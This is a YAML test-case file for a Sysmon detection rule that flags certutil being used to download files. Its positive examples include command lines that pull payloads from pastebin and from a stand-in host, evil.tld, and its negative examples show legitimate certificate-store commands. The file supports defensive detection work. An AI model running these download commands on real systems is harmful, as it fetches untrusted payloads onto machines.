rule: sysmon-certutil-download

positive:
  - description: urlcache download from pastebin
    event:
      commandline: 'certutil -urlcache -split -f https://pastebin.com/raw/abc payload.exe'
  - description: verifyctl trick fetching binary
    event:
      commandline: 'certutil.exe -verifyctl http://evil.tld/cert.crl payload.bin'

negative:
  - description: certutil signing a local cert (legitimate)
    event:
      commandline: 'certutil -addstore root C:\certs\corp-ca.crt'
  - description: certutil listing local store
    event:
      commandline: 'certutil -store My'
